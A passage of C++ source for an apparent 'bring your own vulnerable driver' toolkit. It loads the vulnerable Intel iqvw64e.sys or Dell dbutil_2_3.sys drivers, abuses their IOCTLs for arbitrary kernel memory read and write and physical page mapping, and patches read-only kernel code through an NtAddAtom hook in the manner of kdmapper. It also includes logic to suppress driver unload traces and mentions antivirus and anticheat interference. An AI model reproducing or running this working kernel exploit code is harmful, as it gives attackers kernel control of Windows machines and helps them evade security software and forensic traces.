        for (const auto& m : kmem::EnumKernelModules()) {
            if (ToLower(m.name).find(L"ntoskrnl") != std::wstring::npos) {
                ntosBase = m.base;
                break;
            }
        }
        uint16_t mz = 0;
        if (!ntosBase || !ReadKernelMemory(ntosBase, &mz, sizeof(mz)) || mz != IMAGE_DOS_SIGNATURE) {
            std::wcerr << L"[hinv::byovd] iqvw64e copy primitive failed sanity check "
                       << L"(antivirus/anticheat interference?)\n";
            Shutdown();
            return false;
        }

        std::cout << "[hinv::byovd] Intel iqvw64e backend ready (device opened, copy verified)\n";
        return true;
    }

    bool Shutdown() override {
        kmem::Trace("byovd: shutdown begin");
        if (teardownBlocked_) return false;
        if (!kmem::KernelCallsUsable()) {
            std::wcerr << L"[hinv::byovd] Refusing teardown while the kernel-call hook state is uncertain\n";
            return false;
        }
        if (ownsService_ && hDevice_ == INVALID_HANDLE_VALUE &&
            !serviceStopConfirmed_ && !unloadPrevention_.armed) {
            std::wcerr << L"[hinv::byovd] Refusing teardown without a confirmed device/prevention state\n";
            return false;
        }
        if (hDevice_ != INVALID_HANDLE_VALUE) {
            if (ownsService_ && !unloadPrevention_.armed &&
                !maintenance::PrepareDriverUnload(this, hDevice_, &unloadPrevention_)) {
                std::wcerr << L"[hinv::byovd] Refusing teardown: unload-trace prevention was not confirmed\n";
                return false;
            }
            // Release the device reference before asking SCM to unload the
            // driver. Keeping \Device\Nal open can leave a kernel service in
            // STOP_PENDING until this process exits, which makes a successful
            // unload look like a teardown failure.
            if (!CloseHandle(hDevice_)) return false;
            hDevice_ = INVALID_HANDLE_VALUE;
            kmem::Trace("byovd: device handle closed");

            if (ownsService_ && !StopDriverService(serviceName_)) {
                kmem::Trace("byovd: service stop FAILED");
                if (unloadPrevention_.armed &&
                    !maintenance::RestoreDriverUnload(this, unloadPrevention_)) {
                    std::wcerr << L"[hinv::byovd] Could not restore driver name after failed stop\n";
                    teardownBlocked_ = true;
                }
                return false;
            }
            if (ownsService_) serviceStopConfirmed_ = true;
            if (!ownsService_ && unloadPrevention_.armed &&
                !maintenance::RestoreDriverUnload(this, unloadPrevention_)) {
                teardownBlocked_ = true;
                return false;
            }
        }
        // Only tear down the service when THIS instance installed it — an abort
        // path (e.g. the \\.\Nal probe) must never stop another live instance's
        // driver out from under its open handle.
        if (ownsService_ && !serviceName_.empty()) {
            bool stopped = serviceStopConfirmed_ || StopDriverService(serviceName_);
            if (stopped) serviceStopConfirmed_ = true;
            kmem::Trace(stopped ? "byovd: service stopped" : "byovd: service stop FAILED");
            if (stopped) {
                bool removed = RemoveDriverService(serviceName_);
                kmem::Trace(removed ? "byovd: service removed" : "byovd: service removal FAILED");
                if (!removed)
                    std::wcerr << L"[hinv::byovd] Service remains registered: " << serviceName_ << L"\n";
                if (removed) {
                    serviceName_.clear();
                    ownsService_ = false;
                } else {
                    return false;
                }
            } else {
                std::wcerr << L"[hinv::byovd] Refusing to delete a service that may still be loaded: "
                           << serviceName_ << L"\n";
                return false;
            }
        }
        kmem::Trace("byovd: shutdown end");
        return true;
    }

    // Removes only a leftover kernel-driver service whose canonical binary path
    // exactly matches the guarded path selected by LoadVulnerableDriver.
    LeftoverRecovery TryRemoveOwnLeftover() {
        SC_HANDLE hScm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
        if (!hScm) return LeftoverRecovery::Failed;

        SC_HANDLE hSvc = OpenServiceW(hScm, serviceName_.c_str(), SERVICE_QUERY_CONFIG);
        if (!hSvc) {
            const DWORD err = GetLastError();
            CloseServiceHandle(hScm);
            if (err == ERROR_SERVICE_DOES_NOT_EXIST) return LeftoverRecovery::NotFound;
            if (err == ERROR_SERVICE_MARKED_FOR_DELETE &&
                WaitForServiceDeletion(serviceName_, 10000)) {
                return LeftoverRecovery::Removed;
            }
            std::wcerr << L"[hinv::byovd] Could not inspect leftover Intel service: " << err << L"\n";
            return LeftoverRecovery::Failed;
        }

        std::wstring registered;
        DWORD serviceType = 0;
        const bool queried = QueryCanonicalServiceBinaryPath(hSvc, registered, &serviceType);
        CloseServiceHandle(hSvc);
        CloseServiceHandle(hScm);

        const std::wstring ours = NormalizeCanonicalPath(driverPath_);
        if (!queried || serviceType != SERVICE_KERNEL_DRIVER || ours.empty() || registered != ours) {
            std::wcerr << L"[hinv::byovd] Refusing to recover Intel service with a different binary path\n";
            return LeftoverRecovery::Failed;
        }

        // The inspection handle and every stop handle are closed before the
        // path is revalidated under the SCM database lock and deletion begins.
        if (!StopDriverService(serviceName_)) return LeftoverRecovery::Failed;
        if (!RemoveDriverServiceIfPathMatches(serviceName_, driverPath_))
            return LeftoverRecovery::Failed;
        if (!WaitForServiceDeletion(serviceName_, 10000)) {
            std::wcerr << L"[hinv::byovd] Timed out waiting for Intel service deletion\n";
            return LeftoverRecovery::Failed;
        }
        return LeftoverRecovery::Removed;
    }

    bool IsReady() const override { return hDevice_ != INVALID_HANDLE_VALUE; }

    // kdmapper intel_driver.cpp MemCopy(): case 0x33 copies 'length' bytes
    // from 'source' to 'destination'; either side may be a kernel VA or a
    // usermode buffer.
    // Named MemCopy after kdmapper (CopyMemory would clash with the Windows macro).
    bool MemCopy(uint64_t destination, uint64_t source, uint64_t size) {
        if (!destination || !source || !size ||
            size - 1 > UINT64_MAX - destination || size - 1 > UINT64_MAX - source)
            return false;

        Iqvw64eCopyMemoryInfo req{};
        req.case_number = 0x33;
        req.source = source;
        req.destination = destination;
        req.length = size;

        DWORD bytes = 0;
        return DeviceIoControl(hDevice_, IOCTL_IQVW64E_COPY_MEMORY,
                               &req, sizeof(req), nullptr, 0, &bytes, nullptr) == TRUE;
    }

    // kdmapper: ReadMemory(addr, buf, size) == MemCopy(buf, addr, size).
    bool ReadKernelMemory(uint64_t kernelVa, void* out, size_t size) override {
        if (!IsReady() || !out || !ValidAddressRange(kernelVa, size)) return false;
        constexpr size_t CHUNK = 0x1000;
        auto* dst = static_cast<uint8_t*>(out);
        for (size_t off = 0; off < size; off += CHUNK) {
            size_t n = (off + CHUNK > size) ? (size - off) : CHUNK;
            if (!MemCopy(reinterpret_cast<uint64_t>(dst + off), kernelVa + off, n))
                return false;
        }
        return true;
    }

    // kdmapper: WriteMemory(addr, buf, size) == MemCopy(addr, buf, size).
    bool WriteKernelMemory(uint64_t kernelVa, const void* inBuf, size_t size) override {
        if (!IsReady() || !inBuf || !ValidAddressRange(kernelVa, size)) return false;
        constexpr size_t CHUNK = 0x1000;
        const auto* src = static_cast<const uint8_t*>(inBuf);
        for (size_t off = 0; off < size; off += CHUNK) {
            size_t n = (off + CHUNK > size) ? (size - off) : CHUNK;
            if (!MemCopy(kernelVa + off, reinterpret_cast<uint64_t>(src + off), n))
                return false;
        }
        return true;
    }

    // kdmapper intel_driver.cpp GetPhysicalAddress/MapIoSpace/UnmapIoSpace:
    // extra cases of the same multifunctional IOCTL.
    bool GetPhysicalAddress(uint64_t va, uint64_t& outPa) {
        if (!IsReady() || !va) return false;
        Iqvw64eGetPhysInfo req{};
        req.case_number = 0x25;
        req.address_to_translate = va;
        DWORD bytes = 0;
        if (!DeviceIoControl(hDevice_, IOCTL_IQVW64E_COPY_MEMORY,
                             &req, sizeof(req), nullptr, 0, &bytes, nullptr))
            return false;
        outPa = req.return_physical_address;
        return true;
    }

    uint64_t MapIoSpace(uint64_t pa, uint32_t size) {
        if (!IsReady() || !pa || !size) return 0;
        Iqvw64eMapIoSpaceInfo req{};
        req.case_number = 0x19;
        req.physical_address_to_map = pa;
        req.size = size;
        DWORD bytes = 0;
        if (!DeviceIoControl(hDevice_, IOCTL_IQVW64E_COPY_MEMORY,
                             &req, sizeof(req), nullptr, 0, &bytes, nullptr))
            return 0;
        return req.return_virtual_address;
    }

    bool UnmapIoSpace(uint64_t va, uint32_t size) {
        if (!IsReady() || !va || !size) return false;
        Iqvw64eUnmapIoSpaceInfo req{};
        req.case_number = 0x1A;
        req.virt_address = va;
        req.number_of_bytes = size;
        DWORD bytes = 0;
        return DeviceIoControl(hDevice_, IOCTL_IQVW64E_COPY_MEMORY,
                               &req, sizeof(req), nullptr, 0, &bytes, nullptr) == TRUE;
    }

    // kdmapper WriteToReadOnlyMemory: translate VA->PA, map the physical page
    // and write through the mapping. This is what lets us patch read-only
    // kernel code (the ntoskrnl!NtAddAtom hook) without touching page tables.
    // Sliced per virtual page: a range crossing a 4K boundary needs its own
    // VA->PA translation per page (virtual contiguity says nothing about
    // physical contiguity — a single MapIoSpace would write into an unrelated
    // physical page).
    bool WriteReadOnlyMemory(uint64_t kernelVa, const void* buf, size_t size) override {
        if (!IsReady() || !buf || !ValidAddressRange(kernelVa, size) || size > 0xFFFFFFFF) return false;
        const auto* src = static_cast<const uint8_t*>(buf);
        for (size_t done = 0; done < size;) {
            uint64_t va = kernelVa + done;
            size_t slice = 0x1000 - (va & 0xFFF);
            if (slice > size - done) slice = size - done;

            kmem::Trace("byovd: getphys begin");
            uint64_t pa = 0;
            if (!GetPhysicalAddress(va, pa) || !pa) { kmem::Trace("byovd: getphys failed"); return false; }
            kmem::Trace("byovd: mapiospace begin");
            uint64_t mapped = MapIoSpace(pa, static_cast<uint32_t>(slice));
            if (!mapped) { kmem::Trace("byovd: mapiospace failed"); return false; }
            bool ok = WriteKernelMemory(mapped, src + done, slice);
            kmem::Trace(ok ? "byovd: phys write ok" : "byovd: phys write failed");
            if (!UnmapIoSpace(mapped, static_cast<uint32_t>(slice))) {
                // A leaked physical mapping is a dangling window into an
                // arbitrary page — never silent.
                std::cerr << "[hinv::byovd] UnmapIoSpace failed for VA 0x" << std::hex << mapped << std::dec << "\n";
                kmem::Trace("byovd: unmap FAILED");
                return false;
            }
            if (!ok) return false;
            done += slice;
        }
        return true;
    }

    bool WriteReadOnlyMemoryAtomic8(uint64_t kernelVa, uint64_t value) override {
        // NtAddAtom's entry patch is deliberately restricted to one naturally
        // aligned store that cannot straddle a physical page. A generic
        // chunked write would reintroduce the torn-instruction window.
        if (!IsReady() || (kernelVa & 7) != 0 || (kernelVa & 0xFFF) > 0xFF8)
            return false;

        uint64_t physical = 0;
        if (!GetPhysicalAddress(kernelVa, physical) || !physical)
            return false;
        const uint64_t mapped = MapIoSpace(physical, sizeof(value));
        if (!mapped)
            return false;

        const bool wrote = MemCopy(mapped, reinterpret_cast<uint64_t>(&value), sizeof(value));
        const bool unmapped = UnmapIoSpace(mapped, sizeof(value));
        if (!unmapped) {
            std::cerr << "[hinv::byovd] Atomic hook write left a physical mapping active\n";
            return false;
        }
        return wrote;
    }
};

// ============================================================================
// Profile detection & factory
// ============================================================================

static DriverProfile DbUtilProfile(const std::wstring& driverFileName) {
    return {
        BackendType::DbUtil,
        L"hinv_byovd_dbutil",
        L"\\\\.\\DBUtil_2_3",
        driverFileName,
        0x9B0C1EC4,
        0x9B0C1EC8,
        L"0296e2ce999e67c76352613a718e11516fe1b0efc3ffdb8918fc999dd76a73a5"
    };
}

static const wchar_t* BackendName(BackendType type) {
    switch (type) {
        case BackendType::DbUtil:   return L"Dell dbutil_2_3.sys";
        case BackendType::Intel:    return L"Intel iqvw64e.sys (kdmapper-compatible)";
        default:                    return L"unknown";
    }
}

DriverProfile DetectProfile(const std::wstring& driverFileName) {
    std::wstring lower = ToLower(driverFileName);

    if (lower == L"dbutil_2_3.sys") {
        return DbUtilProfile(driverFileName);
    }

    if (lower == L"iqvw64e.sys") {
        return {
            BackendType::Intel,
            L"hinv_byovd_intel",
            L"\\\\.\\Nal", // kdmapper intel_driver.cpp: device is always \\.\Nal
            driverFileName,
            IOCTL_IQVW64E_COPY_MEMORY,
            IOCTL_IQVW64E_COPY_MEMORY,
            L"4429f32db1cc70567919d7d47b844a91cf1329a6cd116f582305f3b7b60cd60b"
        };
    }

    // No silent fallback: an unrecognized name used to fall into the DbUtil
    // backend, which a wrong-name driver cannot satisfy — and with the real
    // dbutil_2_3 wire format, an unknown binary would likely BSOD on the first
    // IOCTL. Refuse instead.
    std::wcerr << L"[hinv::byovd] Unrecognized driver name '" << driverFileName
               << L"' (supported: iqvw64e.sys, dbutil_2_3.sys)\n";
    return { BackendType::Unknown, {}, {}, driverFileName, 0, 0, {} };
}

std::unique_ptr<IByovdBackend> CreateBackend(const DriverProfile& profile) {
    if (profile.type == BackendType::DbUtil) {
        auto backend = std::make_unique<DbUtilBackend>();
        backend->profile_ = profile;
        return backend;
    }
    if (profile.type == BackendType::Intel) {
        auto backend = std::make_unique<IntelBackend>();
        backend->profile_ = profile;
        return backend;
    }
    return nullptr;
}

std::unique_ptr<IByovdBackend> LoadVulnerableDriver(const std::wstring& driverPath) {
    std::wstring canonicalPath;
    ScopedFileHandle driverGuard;
    if (!OpenGuardedDriverFile(driverPath, canonicalPath, driverGuard)) return nullptr;

    size_t pos = canonicalPath.find_last_of(L"\\/");
    std::wstring fileName = (pos == std::wstring::npos) ? canonicalPath : canonicalPath.substr(pos + 1);
    DriverProfile profile = DetectProfile(fileName);
    if (profile.type == BackendType::Unknown) {
        std::wcerr << L"[hinv::byovd] Unknown vulnerable driver: " << fileName << L"\n";
        return nullptr;
    }
    if (!VerifyDriverProfile(driverGuard.get(), profile)) return nullptr;
    std::wcout << L"[hinv::byovd] Selected backend for " << fileName << L": "
               << BackendName(profile.type) << L"\n";
    auto backend = CreateBackend(profile);
    if (backend && !backend->Initialize(canonicalPath)) {
        backend.reset();
    }
    return backend;
}

} // namespace byovd
} // namespace hinv
